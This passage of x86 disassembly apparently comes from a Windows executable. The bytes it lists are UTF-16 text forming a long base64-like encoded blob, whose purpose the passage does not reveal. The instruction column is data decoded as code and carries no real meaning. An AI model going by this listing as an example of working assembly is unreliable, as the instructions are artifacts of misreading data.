  408e3e:	00 44 00 73          	add    %al,0x73(%eax,%eax,1)
  408e42:	00 66 00             	add    %ah,0x0(%esi)
  408e45:	56                   	push   %esi
  408e46:	00 31                	add    %dh,(%ecx)
  408e48:	00 49 00             	add    %cl,0x0(%ecx)
  408e4b:	4e                   	dec    %esi
  408e4c:	00 72 00             	add    %dh,0x0(%edx)
  408e4f:	42                   	inc    %edx
  408e50:	00 4b 00             	add    %cl,0x0(%ebx)
  408e53:	64 00 64 00 39       	add    %ah,%fs:0x39(%eax,%eax,1)
  408e58:	00 6a 00             	add    %ch,0x0(%edx)
  408e5b:	6a 00                	push   $0x0
  408e5d:	74 00                	je     0x408e5f
  408e5f:	4d                   	dec    %ebp
  408e60:	00 50 00             	add    %dl,0x0(%eax)
  408e63:	35 00 46 00 72       	xor    $0x72004600,%eax
  408e68:	00 30                	add    %dh,(%eax)
  408e6a:	00 2f                	add    %ch,(%edi)
  408e6c:	00 4e 00             	add    %cl,0x0(%esi)
  408e6f:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  408e72:	00 78 00             	add    %bh,0x0(%eax)
  408e75:	77 00                	ja     0x408e77
  408e77:	62 00                	bound  %eax,(%eax)
  408e79:	6c                   	insb   (%dx),%es:(%edi)
  408e7a:	00 58 00             	add    %bl,0x0(%eax)
  408e7d:	63 00                	arpl   %eax,(%eax)
  408e7f:	54                   	push   %esp
  408e80:	00 4d 00             	add    %cl,0x0(%ebp)
  408e83:	32 00                	xor    (%eax),%al
  408e85:	48                   	dec    %eax
  408e86:	00 6f 00             	add    %ch,0x0(%edi)
  408e89:	6f                   	outsl  %ds:(%esi),(%dx)
  408e8a:	00 7a 00             	add    %bh,0x0(%edx)
  408e8d:	74 00                	je     0x408e8f
  408e8f:	50                   	push   %eax
  408e90:	00 6f 00             	add    %ch,0x0(%edi)
  408e93:	54                   	push   %esp
  408e94:	00 71 00             	add    %dh,0x0(%ecx)
  408e97:	44                   	inc    %esp
  408e98:	00 79 00             	add    %bh,0x0(%ecx)
  408e9b:	45                   	inc    %ebp
  408e9c:	00 71 00             	add    %dh,0x0(%ecx)
  408e9f:	34 00                	xor    $0x0,%al
  408ea1:	76 00                	jbe    0x408ea3
  408ea3:	64 00 44 00 42       	add    %al,%fs:0x42(%eax,%eax,1)
  408ea8:	00 67 00             	add    %ah,0x0(%edi)
  408eab:	77 00                	ja     0x408ead
  408ead:	68 00 76 00 70       	push   $0x70007600
  408eb2:	00 7a 00             	add    %bh,0x0(%edx)
  408eb5:	57                   	push   %edi
  408eb6:	00 57 00             	add    %dl,0x0(%edi)
  408eb9:	47                   	inc    %edi
  408eba:	00 53 00             	add    %dl,0x0(%ebx)
  408ebd:	55                   	push   %ebp
  408ebe:	00 65 00             	add    %ah,0x0(%ebp)
  408ec1:	46                   	inc    %esi
  408ec2:	00 41 00             	add    %al,0x0(%ecx)
  408ec5:	48                   	dec    %eax
  408ec6:	00 6f 00             	add    %ch,0x0(%edi)
  408ec9:	63 00                	arpl   %eax,(%eax)
  408ecb:	34 00                	xor    $0x0,%al
  408ecd:	74 00                	je     0x408ecf
  408ecf:	4f                   	dec    %edi
  408ed0:	00 45 00             	add    %al,0x0(%ebp)
  408ed3:	79 00                	jns    0x408ed5
  408ed5:	52                   	push   %edx
  408ed6:	00 5a 00             	add    %bl,0x0(%edx)
  408ed9:	68 00 47 00 51       	push   $0x51004700
  408ede:	00 61 00             	add    %ah,0x0(%ecx)
  408ee1:	58                   	pop    %eax
  408ee2:	00 50 00             	add    %dl,0x0(%eax)
  408ee5:	43                   	inc    %ebx
  408ee6:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
  408eea:	00 58 00             	add    %bl,0x0(%eax)
  408eed:	5a                   	pop    %edx
  408eee:	00 52 00             	add    %dl,0x0(%edx)
  408ef1:	50                   	push   %eax
  408ef2:	00 59 00             	add    %bl,0x0(%ecx)
  408ef5:	74 00                	je     0x408ef7
  408ef7:	2f                   	das
  408ef8:	00 72 00             	add    %dh,0x0(%edx)
  408efb:	71 00                	jno    0x408efd
  408efd:	4d                   	dec    %ebp
  408efe:	00 6e 00             	add    %ch,0x0(%esi)
  408f01:	7a 00                	jp     0x408f03
  408f03:	51                   	push   %ecx
  408f04:	00 43 00             	add    %al,0x0(%ebx)
  408f07:	6e                   	outsb  %ds:(%esi),(%dx)
  408f08:	00 65 00             	add    %ah,0x0(%ebp)
  408f0b:	6d                   	insl   (%dx),%es:(%edi)
  408f0c:	00 30                	add    %dh,(%eax)
  408f0e:	00 67 00             	add    %ah,0x0(%edi)
  408f11:	43                   	inc    %ebx
  408f12:	00 78 00             	add    %bh,0x0(%eax)
  408f15:	6e                   	outsb  %ds:(%esi),(%dx)
  408f16:	00 35 00 71 00 78    	add    %dh,0x78007100
  408f1c:	00 45 00             	add    %al,0x0(%ebp)
  408f1f:	75 00                	jne    0x408f21
  408f21:	54                   	push   %esp
  408f22:	00 75 00             	add    %dh,0x0(%ebp)
  408f25:	6f                   	outsl  %ds:(%esi),(%dx)
  408f26:	00 31                	add    %dh,(%ecx)
  408f28:	00 75 00             	add    %dh,0x0(%ebp)
  408f2b:	4a                   	dec    %edx
  408f2c:	00 4d 00             	add    %cl,0x0(%ebp)
  408f2f:	35 00 4f 00 49       	xor    $0x49004f00,%eax
  408f34:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  408f38:	00 78 00             	add    %bh,0x0(%eax)
  408f3b:	4c                   	dec    %esp
  408f3c:	00 31                	add    %dh,(%ecx)
  408f3e:	00 4a 00             	add    %cl,0x0(%edx)
  408f41:	62 00                	bound  %eax,(%eax)
  408f43:	35 00 7a 00 6f       	xor    $0x6f007a00,%eax
  408f48:	00 35 00 6a 00 6a    	add    %dh,0x6a006a00
  408f4e:	00 46 00             	add    %al,0x0(%esi)
  408f51:	78 00                	js     0x408f53
  408f53:	50                   	push   %eax
  408f54:	00 49 00             	add    %cl,0x0(%ecx)
  408f57:	43                   	inc    %ebx
  408f58:	00 48 00             	add    %cl,0x0(%eax)
  408f5b:	4e                   	dec    %esi
  408f5c:	00 6a 00             	add    %ch,0x0(%edx)
  408f5f:	75 00                	jne    0x408f61
  408f61:	69 00 53 00 74 00    	imul   $0x740053,(%eax),%eax
  408f67:	2b 00                	sub    (%eax),%eax
  408f69:	68 00 64 00 63       	push   $0x63006400
  408f6e:	00 4b 00             	add    %cl,0x0(%ebx)
  408f71:	6d                   	insl   (%dx),%es:(%edi)
  408f72:	00 57 00             	add    %dl,0x0(%edi)
  408f75:	6f                   	outsl  %ds:(%esi),(%dx)
  408f76:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  408f7a:	00 61 00             	add    %ah,0x0(%ecx)
  408f7d:	57                   	push   %edi
  408f7e:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  408f82:	00 35 00 65 00 78    	add    %dh,0x78006500
  408f88:	00 6b 00             	add    %ch,0x0(%ebx)
  408f8b:	6f                   	outsl  %ds:(%esi),(%dx)
  408f8c:	00 73 00             	add    %dh,0x0(%ebx)
  408f8f:	73 00                	jae    0x408f91
  408f91:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  408f95:	76 00                	jbe    0x408f97
  408f97:	66 00 32             	data16 add %dh,(%edx)
  408f9a:	00 79 00             	add    %bh,0x0(%ecx)
  408f9d:	4d                   	dec    %ebp
  408f9e:	00 33                	add    %dh,(%ebx)
  408fa0:	00 66 00             	add    %ah,0x0(%esi)
  408fa3:	56                   	push   %esi
  408fa4:	00 53 00             	add    %dl,0x0(%ebx)
  408fa7:	77 00                	ja     0x408fa9
  408fa9:	62 00                	bound  %eax,(%eax)
  408fab:	31 00                	xor    %eax,(%eax)
  408fad:	6a 00                	push   $0x0
  408faf:	58                   	pop    %eax
  408fb0:	00 4e 00             	add    %cl,0x0(%esi)
  408fb3:	59                   	pop    %ecx
  408fb4:	00 34 00             	add    %dh,(%eax,%eax,1)
  408fb7:	4b                   	dec    %ebx
  408fb8:	00 30                	add    %dh,(%eax)
  408fba:	00 31                	add    %dh,(%ecx)
  408fbc:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  408fc0:	00 6d 00             	add    %ch,0x0(%ebp)
  408fc3:	2b 00                	sub    (%eax),%eax
  408fc5:	61                   	popa
  408fc6:	00 63 00             	add    %ah,0x0(%ebx)
  408fc9:	58                   	pop    %eax
  408fca:	00 5a 00             	add    %bl,0x0(%edx)
  408fcd:	39 00                	cmp    %eax,(%eax)
  408fcf:	59                   	pop    %ecx
  408fd0:	00 6f 00             	add    %ch,0x0(%edi)
  408fd3:	50                   	push   %eax
  408fd4:	00 45 00             	add    %al,0x0(%ebp)
  408fd7:	6a 00                	push   $0x0
  408fd9:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  408fdd:	31 00                	xor    %eax,(%eax)
  408fdf:	75 00                	jne    0x408fe1
  408fe1:	74 00                	je     0x408fe3
  408fe3:	6e                   	outsb  %ds:(%esi),(%dx)
  408fe4:	00 31                	add    %dh,(%ecx)
  408fe6:	00 48 00             	add    %cl,0x0(%eax)
  408fe9:	46                   	inc    %esi
  408fea:	00 45 00             	add    %al,0x0(%ebp)
  408fed:	5a                   	pop    %edx
  408fee:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  408ff2:	00 2f                	add    %ch,(%edi)
  408ff4:	00 6a 00             	add    %ch,0x0(%edx)
  408ff7:	51                   	push   %ecx
  408ff8:	00 35 00 30 00 30    	add    %dh,0x30003000
  408ffe:	00 79 00             	add    %bh,0x0(%ecx)
  409001:	71 00                	jno    0x409003
  409003:	6a 00                	push   $0x0
  409005:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  409009:	54                   	push   %esp
  40900a:	00 79 00             	add    %bh,0x0(%ecx)
  40900d:	51                   	push   %ecx
  40900e:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  409012:	00 2f                	add    %ch,(%edi)
  409014:	00 4d 00             	add    %cl,0x0(%ebp)
  409017:	6f                   	outsl  %ds:(%esi),(%dx)
  409018:	00 75 00             	add    %dh,0x0(%ebp)
  40901b:	5a                   	pop    %edx
  40901c:	00 41 00             	add    %al,0x0(%ecx)
  40901f:	36 00 74 00 76       	add    %dh,%ss:0x76(%eax,%eax,1)
  409024:	00 70 00             	add    %dh,0x0(%eax)
  409027:	6d                   	insl   (%dx),%es:(%edi)
  409028:	00 76 00             	add    %dh,0x0(%esi)
  40902b:	69 00 45 00 4b 00    	imul   $0x4b0045,(%eax),%eax
  409031:	6b 00 61             	imul   $0x61,(%eax),%eax
  409034:	00 38                	add    %bh,(%eax)
  409036:	00 53 00             	add    %dl,0x0(%ebx)
  409039:	6e                   	outsb  %ds:(%esi),(%dx)
  40903a:	00 67 00             	add    %ah,0x0(%edi)
  40903d:	68 00 42 00 52       	push   $0x52004200
  409042:	00 66 00             	add    %ah,0x0(%esi)
  409045:	46                   	inc    %esi
  409046:	00 50 00             	add    %dl,0x0(%eax)
  409049:	48                   	dec    %eax
  40904a:	00 57 00             	add    %dl,0x0(%edi)
  40904d:	72 00                	jb     0x40904f
  40904f:	6d                   	insl   (%dx),%es:(%edi)
  409050:	00 63 00             	add    %ah,0x0(%ebx)
  409053:	55                   	push   %ebp
  409054:	00 50 00             	add    %dl,0x0(%eax)
  409057:	61                   	popa
  409058:	00 50 00             	add    %dl,0x0(%eax)
  40905b:	6d                   	insl   (%dx),%es:(%edi)
  40905c:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  409060:	00 46 00             	add    %al,0x0(%esi)
  409063:	76 00                	jbe    0x409065
  409065:	55                   	push   %ebp
  409066:	00 57 00             	add    %dl,0x0(%edi)
  409069:	6f                   	outsl  %ds:(%esi),(%dx)
  40906a:	00 73 00             	add    %dh,0x0(%ebx)
  40906d:	39 00                	cmp    %eax,(%eax)
  40906f:	6a 00                	push   $0x0
  409071:	79 00                	jns    0x409073
  409073:	4b                   	dec    %ebx
  409074:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  409078:	00 59 00             	add    %bl,0x0(%ecx)
  40907b:	33 00                	xor    (%eax),%eax
  40907d:	31 00                	xor    %eax,(%eax)
  40907f:	38 00                	cmp    %al,(%eax)
  409081:	4a                   	dec    %edx
  409082:	00 2b                	add    %ch,(%ebx)
  409084:	00 42 00             	add    %al,0x0(%edx)
  409087:	41                   	inc    %ecx
  409088:	00 79 00             	add    %bh,0x0(%ecx)
  40908b:	33 00                	xor    (%eax),%eax
  40908d:	49                   	dec    %ecx
  40908e:	00 76 00             	add    %dh,0x0(%esi)
  409091:	57                   	push   %edi
  409092:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  409096:	00 31                	add    %dh,(%ecx)
  409098:	00 42 00             	add    %al,0x0(%edx)
  40909b:	76 00                	jbe    0x40909d
  40909d:	78 00                	js     0x40909f
  40909f:	76 00                	jbe    0x4090a1
  4090a1:	68 00 52 00 6b       	push   $0x6b005200
  4090a6:	00 4a 00             	add    %cl,0x0(%edx)
  4090a9:	6d                   	insl   (%dx),%es:(%edi)
  4090aa:	00 70 00             	add    %dh,0x0(%eax)
  4090ad:	47                   	inc    %edi
  4090ae:	00 61 00             	add    %ah,0x0(%ecx)
  4090b1:	69 00 32 00 51 00    	imul   $0x510032,(%eax),%eax
  4090b7:	6d                   	insl   (%dx),%es:(%edi)
  4090b8:	00 51 00             	add    %dl,0x0(%ecx)
  4090bb:	44                   	inc    %esp
  4090bc:	00 4c 00 48          	add    %cl,0x48(%eax,%eax,1)
  4090c0:	00 65 00             	add    %ah,0x0(%ebp)
  4090c3:	70 00                	jo     0x4090c5
  4090c5:	77 00                	ja     0x4090c7
  4090c7:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  4090cb:	4e                   	dec    %esi
  4090cc:	00 46 00             	add    %al,0x0(%esi)
  4090cf:	47                   	inc    %edi
  4090d0:	00 57 00             	add    %dl,0x0(%edi)
  4090d3:	4b                   	dec    %ebx
  4090d4:	00 65 00             	add    %ah,0x0(%ebp)
  4090d7:	2b 00                	sub    (%eax),%eax
  4090d9:	31 00                	xor    %eax,(%eax)
  4090db:	76 00                	jbe    0x4090dd
  4090dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4090de:	00 7a 00             	add    %bh,0x0(%edx)
  4090e1:	5a                   	pop    %edx
  4090e2:	00 73 00             	add    %dh,0x0(%ebx)
  4090e5:	2b 00                	sub    (%eax),%eax
  4090e7:	69 00 70 00 45 00    	imul   $0x450070,(%eax),%eax
  4090ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4090ee:	00 45 00             	add    %al,0x0(%ebp)
  4090f1:	51                   	push   %ecx
  4090f2:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  4090f6:	00 67 00             	add    %ah,0x0(%edi)
  4090f9:	49                   	dec    %ecx
  4090fa:	00 76 00             	add    %dh,0x0(%esi)
  4090fd:	66 00 74 00 6a       	data16 add %dh,0x6a(%eax,%eax,1)
  409102:	00 30                	add    %dh,(%eax)
  409104:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  409108:	00 32                	add    %dh,(%edx)
  40910a:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40910e:	00 6e 00             	add    %ch,0x0(%esi)
  409111:	45                   	inc    %ebp
  409112:	00 50 00             	add    %dl,0x0(%eax)
  409115:	4f                   	dec    %edi
  409116:	00 4e 00             	add    %cl,0x0(%esi)
  409119:	59                   	pop    %ecx
  40911a:	00 4e 00             	add    %cl,0x0(%esi)
  40911d:	59                   	pop    %ecx
  40911e:	00 37                	add    %dh,(%edi)
  409120:	00 79 00             	add    %bh,0x0(%ecx)
  409123:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  409126:	00 38                	add    %bh,(%eax)
  409128:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40912c:	00 52 00             	add    %dl,0x0(%edx)
  40912f:	77 00                	ja     0x409131
  409131:	48                   	dec    %eax
  409132:	00 47 00             	add    %al,0x0(%edi)
  409135:	66 00 35 00 76 00 48 	data16 add %dh,0x48007600
  40913c:	00 30                	add    %dh,(%eax)
  40913e:	00 64 00 34          	add    %ah,0x34(%eax,%eax,1)
  409142:	00 78 00             	add    %bh,0x0(%eax)
  409145:	53                   	push   %ebx
  409146:	00 72 00             	add    %dh,0x0(%edx)
  409149:	58                   	pop    %eax
  40914a:	00 36                	add    %dh,(%esi)
  40914c:	00 77 00             	add    %dh,0x0(%edi)
  40914f:	6c                   	insb   (%dx),%es:(%edi)
  409150:	00 68 00             	add    %ch,0x0(%eax)
  409153:	69 00 6c 00 48 00    	imul   $0x48006c,(%eax),%eax
  409159:	72 00                	jb     0x40915b
  40915b:	76 00                	jbe    0x40915d
  40915d:	4c                   	dec    %esp
  40915e:	00 38                	add    %bh,(%eax)
  409160:	00 58 00             	add    %bl,0x0(%eax)
  409163:	57                   	push   %edi
  409164:	00 37                	add    %dh,(%edi)
  409166:	00 46 00             	add    %al,0x0(%esi)
  409169:	63 00                	arpl   %eax,(%eax)
  40916b:	55                   	push   %ebp
  40916c:	00 43 00             	add    %al,0x0(%ebx)
  40916f:	62 00                	bound  %eax,(%eax)
  409171:	2f                   	das
  409172:	00 2b                	add    %ch,(%ebx)
  409174:	00 52 00             	add    %dl,0x0(%edx)
  409177:	31 00                	xor    %eax,(%eax)
  409179:	39 00                	cmp    %eax,(%eax)
  40917b:	5a                   	pop    %edx
  40917c:	00 66 00             	add    %ah,0x0(%esi)
  40917f:	55                   	push   %ebp
  409180:	00 2f                	add    %ch,(%edi)
  409182:	00 6b 00             	add    %ch,0x0(%ebx)
  409185:	72 00                	jb     0x409187
  409187:	70 00                	jo     0x409189
  409189:	30 00                	xor    %al,(%eax)
  40918b:	6d                   	insl   (%dx),%es:(%edi)
  40918c:	00 33                	add    %dh,(%ebx)
  40918e:	00 34 00             	add    %dh,(%eax,%eax,1)
  409191:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  409195:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  409199:	47                   	inc    %edi
  40919a:	00 53 00             	add    %dl,0x0(%ebx)
  40919d:	75 00                	jne    0x40919f
  40919f:	35 00 4d 00 7a       	xor    $0x7a004d00,%eax
  4091a4:	00 6a 00             	add    %ch,0x0(%edx)
  4091a7:	33 00                	xor    (%eax),%eax
  4091a9:	30 00                	xor    %al,(%eax)
  4091ab:	30 00                	xor    %al,(%eax)
  4091ad:	43                   	inc    %ebx
  4091ae:	00 77 00             	add    %dh,0x0(%edi)
  4091b1:	73 00                	jae    0x4091b3
  4091b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4091b4:	00 36                	add    %dh,(%esi)
  4091b6:	00 36                	add    %dh,(%esi)
  4091b8:	00 55 00             	add    %dl,0x0(%ebp)
  4091bb:	35 00 7a 00 54       	xor    $0x54007a00,%eax
  4091c0:	00 2b                	add    %ch,(%ebx)
  4091c2:	00 61 00             	add    %ah,0x0(%ecx)
  4091c5:	39 00                	cmp    %eax,(%eax)
  4091c7:	4f                   	dec    %edi
  4091c8:	00 32                	add    %dh,(%edx)
  4091ca:	00 55 00             	add    %dl,0x0(%ebp)
  4091cd:	42                   	inc    %edx
  4091ce:	00 46 00             	add    %al,0x0(%esi)
  4091d1:	6b 00 58             	imul   $0x58,(%eax),%eax
  4091d4:	00 59 00             	add    %bl,0x0(%ecx)
  4091d7:	52                   	push   %edx
  4091d8:	00 57 00             	add    %dl,0x0(%edi)
  4091db:	61                   	popa
  4091dc:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  4091e0:	00 68 00             	add    %ch,0x0(%eax)
  4091e3:	45                   	inc    %ebp
  4091e4:	00 2b                	add    %ch,(%ebx)
  4091e6:	00 5a 00             	add    %bl,0x0(%edx)
  4091e9:	45                   	inc    %ebp
  4091ea:	00 4a 00             	add    %cl,0x0(%edx)
  4091ed:	44                   	inc    %esp
  4091ee:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  4091f2:	00 50 00             	add    %dl,0x0(%eax)
  4091f5:	7a 00                	jp     0x4091f7
  4091f7:	4e                   	dec    %esi
  4091f8:	00 68 00             	add    %ch,0x0(%eax)
  4091fb:	55                   	push   %ebp
  4091fc:	00 59 00             	add    %bl,0x0(%ecx)
  4091ff:	7a 00                	jp     0x409201
  409201:	6e                   	outsb  %ds:(%esi),(%dx)
  409202:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  409206:	00 77 00             	add    %dh,0x0(%edi)
  409209:	4c                   	dec    %esp
  40920a:	00 68 00             	add    %ch,0x0(%eax)
  40920d:	5a                   	pop    %edx
  40920e:	00 38                	add    %bh,(%eax)
  409210:	00 6d 00             	add    %ch,0x0(%ebp)
  409213:	47                   	inc    %edi
  409214:	00 72 00             	add    %dh,0x0(%edx)
  409217:	61                   	popa
  409218:	00 37                	add    %dh,(%edi)
  40921a:	00 59 00             	add    %bl,0x0(%ecx)
  40921d:	38 00                	cmp    %al,(%eax)
  40921f:	73 00                	jae    0x409221
  409221:	41                   	inc    %ecx
  409222:	00 53 00             	add    %dl,0x0(%ebx)
  409225:	72 00                	jb     0x409227
  409227:	5a                   	pop    %edx
  409228:	00 4b 00             	add    %cl,0x0(%ebx)
  40922b:	73 00                	jae    0x40922d
  40922d:	6d                   	insl   (%dx),%es:(%edi)
  40922e:	00 38                	add    %bh,(%eax)
  409230:	00 32                	add    %dh,(%edx)
  409232:	00 6e 00             	add    %ch,0x0(%esi)
  409235:	77 00                	ja     0x409237
  409237:	41                   	inc    %ecx
  409238:	00 52 00             	add    %dl,0x0(%edx)
  40923b:	4a                   	dec    %edx
  40923c:	00 4d 00             	add    %cl,0x0(%ebp)
  40923f:	33 00                	xor    (%eax),%eax
  409241:	6f                   	outsl  %ds:(%esi),(%dx)
  409242:	00 59 00             	add    %bl,0x0(%ecx)
  409245:	31 00                	xor    %eax,(%eax)
  409247:	76 00                	jbe    0x409249
  409249:	2b 00                	sub    (%eax),%eax
  40924b:	4c                   	dec    %esp
  40924c:	00 31                	add    %dh,(%ecx)
  40924e:	00 39                	add    %bh,(%ecx)
  409250:	00 4d 00             	add    %cl,0x0(%ebp)
  409253:	58                   	pop    %eax
  409254:	00 56 00             	add    %dl,0x0(%esi)
  409257:	6f                   	outsl  %ds:(%esi),(%dx)
  409258:	00 50 00             	add    %dl,0x0(%eax)
  40925b:	57                   	push   %edi
  40925c:	00 72 00             	add    %dh,0x0(%edx)
  40925f:	6d                   	insl   (%dx),%es:(%edi)
  409260:	00 56 00             	add    %dl,0x0(%esi)
  409263:	4b                   	dec    %ebx
  409264:	00 31                	add    %dh,(%ecx)
  409266:	00 70 00             	add    %dh,0x0(%eax)
  409269:	61                   	popa
  40926a:	00 2f                	add    %ch,(%edi)
  40926c:	00 61 00             	add    %ah,0x0(%ecx)
  40926f:	51                   	push   %ecx
  409270:	00 4b 00             	add    %cl,0x0(%ebx)
  409273:	62 00                	bound  %eax,(%eax)
  409275:	61                   	popa
  409276:	00 68 00             	add    %ch,0x0(%eax)
  409279:	49                   	dec    %ecx
  40927a:	00 30                	add    %dh,(%eax)
  40927c:	00 77 00             	add    %dh,0x0(%edi)
  40927f:	76 00                	jbe    0x409281
  409281:	47                   	inc    %edi
  409282:	00 47 00             	add    %al,0x0(%edi)
  409285:	53                   	push   %ebx
  409286:	00 67 00             	add    %ah,0x0(%edi)
  409289:	4e                   	dec    %esi
  40928a:	00 43 00             	add    %al,0x0(%ebx)
  40928d:	79 00                	jns    0x40928f
  40928f:	32 00                	xor    (%eax),%al
  409291:	46                   	inc    %esi
  409292:	00 4f 00             	add    %cl,0x0(%edi)
  409295:	6a 00                	push   $0x0
  409297:	65 00 33             	add    %dh,%gs:(%ebx)
  40929a:	00 70 00             	add    %dh,0x0(%eax)
  40929d:	5a                   	pop    %edx
  40929e:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  4092a2:	00 32                	add    %dh,(%edx)
  4092a4:	00 7a 00             	add    %bh,0x0(%edx)
  4092a7:	59                   	pop    %ecx
  4092a8:	00 58 00             	add    %bl,0x0(%eax)
  4092ab:	50                   	push   %eax
  4092ac:	00 61 00             	add    %ah,0x0(%ecx)
  4092af:	2f                   	das
  4092b0:	00 57 00             	add    %dl,0x0(%edi)
  4092b3:	70 00                	jo     0x4092b5
  4092b5:	6b 00 61             	imul   $0x61,(%eax),%eax
  4092b8:	00 63 00             	add    %ah,0x0(%ebx)
  4092bb:	73 00                	jae    0x4092bd
  4092bd:	33 00                	xor    (%eax),%eax
  4092bf:	48                   	dec    %eax
  4092c0:	00 6d 00             	add    %ch,0x0(%ebp)
  4092c3:	4b                   	dec    %ebx
  4092c4:	00 46 00             	add    %al,0x0(%esi)
  4092c7:	7a 00                	jp     0x4092c9
  4092c9:	6d                   	insl   (%dx),%es:(%edi)
  4092ca:	00 52 00             	add    %dl,0x0(%edx)
  4092cd:	50                   	push   %eax
  4092ce:	00 6d 00             	add    %ch,0x0(%ebp)
  4092d1:	35 00 61 00 73       	xor    $0x73006100,%eax
  4092d6:	00 63 00             	add    %ah,0x0(%ebx)
  4092d9:	43                   	inc    %ebx
  4092da:	00 35 00 53 00 5a    	add    %dh,0x5a005300
  4092e0:	00 6d 00             	add    %ch,0x0(%ebp)
  4092e3:	37                   	aaa
  4092e4:	00 32                	add    %dh,(%edx)
  4092e6:	00 32                	add    %dh,(%edx)
  4092e8:	00 6f 00             	add    %ch,0x0(%edi)
  4092eb:	68 00 62 00 33       	push   $0x33006200
  4092f0:	00 39                	add    %bh,(%ecx)
  4092f2:	00 62 00             	add    %ah,0x0(%edx)
  4092f5:	35 00 35 00 61       	xor    $0x61003500,%eax
  4092fa:	00 66 00             	add    %ah,0x0(%esi)
  4092fd:	77 00                	ja     0x4092ff
  4092ff:	70 00                	jo     0x409301
  409301:	34 00                	xor    $0x0,%al
  409303:	4c                   	dec    %esp
  409304:	00 70 00             	add    %dh,0x0(%eax)
  409307:	5a                   	pop    %edx
  409308:	00 73 00             	add    %dh,0x0(%ebx)
  40930b:	51                   	push   %ecx
  40930c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40930f:	5a                   	pop    %edx
  409310:	00 76 00             	add    %dh,0x0(%esi)
  409313:	33 00                	xor    (%eax),%eax
  409315:	56                   	push   %esi
  409316:	00 6b 00             	add    %ch,0x0(%ebx)
  409319:	50                   	push   %eax
  40931a:	00 33                	add    %dh,(%ebx)
  40931c:	00 79 00             	add    %bh,0x0(%ecx)
  40931f:	4e                   	dec    %esi
  409320:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
  409324:	00 63 00             	add    %ah,0x0(%ebx)
  409327:	31 00                	xor    %eax,(%eax)
  409329:	62 00                	bound  %eax,(%eax)
  40932b:	69 00 58 00 45 00    	imul   $0x450058,(%eax),%eax
  409331:	7a 00                	jp     0x409333
  409333:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  409337:	6c                   	insb   (%dx),%es:(%edi)
  409338:	00 6a 00             	add    %ch,0x0(%edx)
  40933b:	54                   	push   %esp
  40933c:	00 6c 00 7a          	add    %ch,0x7a(%eax,%eax,1)
  409340:	00 70 00             	add    %dh,0x0(%eax)
  409343:	6a 00                	push   $0x0
  409345:	6b 00 51             	imul   $0x51,(%eax),%eax
  409348:	00 2b                	add    %ch,(%ebx)
  40934a:	00 46 00             	add    %al,0x0(%esi)
  40934d:	70 00                	jo     0x40934f
  40934f:	45                   	inc    %ebp
  409350:	00 33                	add    %dh,(%ebx)
  409352:	00 65 00             	add    %ah,0x0(%ebp)
  409355:	6f                   	outsl  %ds:(%esi),(%dx)
  409356:	00 70 00             	add    %dh,0x0(%eax)
  409359:	63 00                	arpl   %eax,(%eax)
  40935b:	46                   	inc    %esi
  40935c:	00 73 00             	add    %dh,0x0(%ebx)
  40935f:	48                   	dec    %eax
  409360:	00 6f 00             	add    %ch,0x0(%edi)
  409363:	5a                   	pop    %edx
  409364:	00 38                	add    %bh,(%eax)
  409366:	00 4c 00 41          	add    %cl,0x41(%eax,%eax,1)
  40936a:	00 6f 00             	add    %ch,0x0(%edi)
  40936d:	6f                   	outsl  %ds:(%esi),(%dx)
  40936e:	00 46 00             	add    %al,0x0(%esi)
  409371:	69 00 48 00 59 00    	imul   $0x590048,(%eax),%eax
  409377:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40937b:	42                   	inc    %edx
  40937c:	00 47 00             	add    %al,0x0(%edi)
  40937f:	4b                   	dec    %ebx
  409380:	00 31                	add    %dh,(%ecx)
  409382:	00 65 00             	add    %ah,0x0(%ebp)
  409385:	33 00                	xor    (%eax),%eax
  409387:	48                   	dec    %eax
  409388:	00 6d 00             	add    %ch,0x0(%ebp)
  40938b:	66 00 30             	data16 add %dh,(%eax)
  40938e:	00 76 00             	add    %dh,0x0(%esi)
  409391:	46                   	inc    %esi
  409392:	00 57 00             	add    %dl,0x0(%edi)
  409395:	33 00                	xor    (%eax),%eax
  409397:	52                   	push   %edx
  409398:	00 63 00             	add    %ah,0x0(%ebx)
  40939b:	63 00                	arpl   %eax,(%eax)
  40939d:	6b 00 47             	imul   $0x47,(%eax),%eax
  4093a0:	00 78 00             	add    %bh,0x0(%eax)
  4093a3:	44                   	inc    %esp
  4093a4:	00 39                	add    %bh,(%ecx)
  4093a6:	00 4f 00             	add    %cl,0x0(%edi)
  4093a9:	51                   	push   %ecx
  4093aa:	00 6a 00             	add    %ch,0x0(%edx)
  4093ad:	71 00                	jno    0x4093af
  4093af:	39 00                	cmp    %eax,(%eax)
  4093b1:	68 00 76 00 4d       	push   $0x4d007600
  4093b6:	00 4f 00             	add    %cl,0x0(%edi)
